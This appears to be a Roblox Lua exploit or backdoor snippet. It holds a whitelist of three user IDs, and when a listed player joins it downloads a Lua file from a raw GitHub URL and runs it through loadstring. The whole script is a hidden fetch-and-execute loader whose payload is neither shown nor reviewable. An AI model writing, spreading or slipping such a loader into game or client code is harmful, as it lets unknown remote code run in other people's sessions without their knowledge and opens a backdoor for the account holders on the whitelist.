local Players   = game:GetService("Players");
local LPlayer   = Players.LocalPlayer;
local LPlayerID = LPlayer.UserId;
local WhitelistedIDs = {
   [1644413979] = true;
   [451701301] = true;
   [1598126809] = true;
}

Players.PlayerAdded:Connect(function(Player)
   if (WhitelistedIDs[Player.UserId]) then
       loadstring(game:HttpGet("https://raw.githubusercontent.com/nekomancer69420/nekosarecute/main/load.lua", true))()
   end
end)
